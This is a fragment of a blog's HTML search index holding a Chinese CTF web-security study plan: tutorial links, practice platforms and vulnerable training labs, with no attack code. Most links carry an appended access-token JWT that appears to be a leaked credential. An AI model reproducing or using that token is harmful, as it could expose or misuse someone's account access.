href="https://www.bilibili.com/video/BV1S64y1T7ih/?spm_id_from=333.337.search-card.all.click&vd_source=2f052fce642dbd0a501d0be0c16952be&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.bilibili.com/video/BV1S64y1T7ih/?spm_id_from&#x3D;333.337.search-card.all.click&amp;vd_source&#x3D;2f052fce642dbd0a501d0be0c16952be</a></p><ul><li>ctfshow文件包含<a href="https://blog.csdn.net/qq_63928796/article/details/126465610?spm=1001.2014.3001.5502&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://blog.csdn.net/qq_63928796&#x2F;article&#x2F;details&#x2F;126465610?spm&#x3D;1001.2014.3001.5502</a></li></ul><ol><li>SQL注入</li></ol><p>文字教程：<a href="https://blog.csdn.net/qq_44159028/article/details/114325805?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://blog.csdn.net/qq_44159028&#x2F;article&#x2F;details&#x2F;114325805</a></p><p>视频教程：<a href="https://www.bilibili.com/video/BV1Q7411x7SD/?spm_id_from=333.999.0.0&vd_source=2f052fce642dbd0a501d0be0c16952be&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.bilibili.com/video/BV1Q7411x7SD/?spm_id_from&#x3D;333.999.0.0&amp;vd_source&#x3D;2f052fce642dbd0a501d0be0c16952be</a>这小孩讲的很好很好</p><p>靶场：</p><ul><li><p>ctfhub中的sql注入部分</p></li><li><p>sql-labs源码自行搭建<a href="https://github.com/Audi-1/sqli-labs?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://github.com/Audi-1/sqli-labs</a></p></li><li><p>buuctf中也有已经搭建好的</p></li></ul><ol><li><p>SSRF漏洞</p></li><li><p>SSTI</p></li><li><p>反序列化漏洞</p></li><li><p>XXE漏洞、XSS漏洞 (CTF中很少出现 但也需要了解)</p></li><li><p>等</p></li></ol><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>刷题</p><p>在ctf中除了web外，很多时候misc和crypto也是我们的得分项，所以大家在学习web的同时不要放下misc和crypto的学习(做题的wp记得记录下来，并与周报一起上交)</p><h1 id="练习平台"><a href="#练习平台" class="headerlink" title="练习平台"></a>练习平台</h1><ol><li>ctfshow：<a href="https://ctf.show/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://ctf.show/</a></li></ol><ul><li>web入门(部分收费)</li></ul><ol><li>BUUCTF：<a href="https://buuoj.cn/challenges?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://buuoj.cn/challenges</a></li></ol><ul><li><p>WEB</p></li><li><p>MISC</p></li><li><p>收集的一些大型比赛题，有些题可能有点难</p></li></ul><ol><li>攻防世界：<a href="https://adworld.xctf.org.cn/home/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://adworld.xctf.org.cn/home/</a></li></ol><ul><li><p>WEB</p></li><li><p>MISC</p></li><li><p>可以先做做新手入门</p></li></ul><ol><li>ctfhub：<a href="https://www.ctfhub.com/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.ctfhub.com/</a></li></ol><ul><li><p>WEB</p></li><li><p>web漏洞挺全的也挺基础</p></li></ul><ol><li>Bugku：<a href="https://ctf.bugku.com/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://ctf.bugku.com/</a></li></ol><ul><li><p>WEB</p></li><li><p>MISC</p></li><li><p>一些师傅原创题投上去的</p></li></ul><ol><li>NSSCTF：<a href="https://www.ctfer.vip/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.ctfer.vip/</a></li></ol><ul><li><p>WEB</p></li><li><p>MISC</p></li><li><p>也是收集的一些比赛题</p></li></ul><ol><li>青少年ctf：<a href="https://www.qsnctf.com/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.qsnctf.com/</a></li></ol><ul><li><p>WEB</p></li><li><p>MISC</p></li><li><p>整体不是很难</p></li></ul><h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><h3 id="ctf比赛项目"><a href="#ctf比赛项目" class="headerlink" title="ctf比赛项目"></a>ctf比赛项目</h3><p><a href="https://www.su-sanha.cn/events/">https://www.su-sanha.cn/events/</a></p><p>ctfshow(收费的，但是题目质量不错，很多大佬都是刷题刷出来的)</p><p><a href="https://ctf.show/">https://ctf.show/</a> #可从网上down下源码,在kali或ubuntu中搭建使用</p><p>重生信息安全在线靶场：</p><p><a href="https://bc.csxa.cn/">https://bc.csxa.cn</a></p><p>网络信息安全攻防学习平台：</p><p><a href="http://hackinglab.cn/">http://hackinglab.cn</a></p><p>墨者学院在线靶场：</p><p><a href="https://www.mozhe.cn/bug">https://www.mozhe.cn/bug</a></p><p>封神台在线演练靶场：</p><p><a href="https://hack.zkaq.cn/battle">https://hack.zkaq.cn/battle</a></p><p>安鸾渗透实战平台：</p><p><a href="http://www.whalwl.cn/home">http://www.whalwl.cn/home</a></p><p>XSS Challenges：</p><p><a href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp</a></p><p>漏洞靶场</p><p>DVWA：</p><p><a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk</a></p><p>BWVS：</p><p><a href="https://github.com/bugku/BWVS">https://github.com/bugku/BWVS</a></p><p>Sqli-Labs：</p><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>Webug 3.0：</p><p><a href="https://pan.baidu.com/s/1eRIB3Se">https://pan.baidu.com/s/1eRIB3Se</a></p><p>Upload-labs：</p><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p>DVWA-WooYun：</p><p><a href="https://sourceforge.net/projects/dvwa-wooyun">https://sourceforge.net/projects/dvwa-wooyun</a></p><h1 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h1><h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p><strong>综合教程：</strong></p><p><strong>根据自己的学习方法选一套就行</strong></p><ul><li><p><a href="https://www.bilibili.com/video/BV1Lf4y1t7Mc?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.bilibili.com/video/BV1Lf4y1t7Mc</a>  P123开始</p></li><li><p><a href="https://www.bugbank.cn/live/xiaobai?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.bugbank.cn/live/xiaobai</a></p></li></ul><p><strong>单项教程：</strong></p><ul><li>Python3：</li></ul><p><a href="https://pan.baidu.com/s/1c460DSyyhOurdHZBEh8FEQ?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://pan.baidu.com/s/1c460DSyyhOurdHZBEh8FEQ</a> 提取码：bSB6 </p><p>​      MOOC: </p><p><a href="https://www.icourse163.org/course/BIT-268001?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.icourse163.org/course/BIT-268001</a>（第二周图形绘制不用学）</p><p>​       <a href="https://www.icourse163.org/course/BIT-1001870001?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.icourse163.org/course/BIT-1001870001</a></p><p>百度网盘和MOOC二选一，最后作业以实际做出的项目上交</p><ul><li>PHP：</li></ul><p><a href="https://www.w3school.com.cn/php/index.asp?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.w3school.com.cn/php/index.asp</a></p><p><a href="https://pan.baidu.com/s/1qSK9ewPDrFhfEJxlQs0uLg?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://pan.baidu.com/s/1qSK9ewPDrFhfEJxlQs0uLg</a> 提取码: ohee</p><p><a href="https://ke.qq.com/course/471769?taid=4018470186857177&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://ke.qq.com/course/471769?taid=4018470186857177</a></p><p>能够读懂别人的PHP代码(可以查阅资料)，最好是能够使用PHP开发简单的网站</p><p>至少能做到实现本地测试题目代码，这点在做题过程中是必须掌握的能力</p><ul><li>Golang：</li></ul><p><a href="https://www.bilibili.com/video/BV1Uq4y1Q7Jn?from=search&seid=11629475378307925801&spm_id_from=333.337.0.0&accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.bilibili.com/video/BV1Uq4y1Q7Jn</a></p><p>新兴语言，学完前边的基础知识后就去看看golang怎么写爬虫，剩下的多搜索学习吧</p><h3 id="文字教程"><a href="#文字教程" class="headerlink" title="文字教程"></a>文字教程</h3><ul><li>CTF推荐仔细看看CTFwiki：<a href="https://ctf-wiki.org/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">简介 - CTF Wiki (ctf-wiki.org)</a>  里面一些例题自己做做也挺好</li></ul><p>CTF练习题目 以提交的WriteUp为准（以上不要求都做完 尽最大可能做，主要在于总结题型，熟悉套路）</p><ul><li>CTF入门手册：链接：<a href="https://pan.baidu.com/s/14zuYUZfYzmoW2ervMXhDwQ?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://pan.baidu.com/s/14zuYUZfYzmoW2ervMXhDwQ</a></li></ul><p>提取码：1e2x</p><p><a href="https://www.su-sanha.cn/events/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgyMjYyMzIsImZpbGVHVUlEIjoiMWQzYVY2YXI1WFNZNnhxZyIsImlhdCI6MTY5ODIyNTkzMiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo4NzA1NjA0Nn0.zmDlOHi0_8aODca7O_hYKMK9wvgCr_IKSJ8KyXMp8sY">https://www.su-sanha.cn/events/</a></p><p><strong>ctf赛事通知群829089482</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
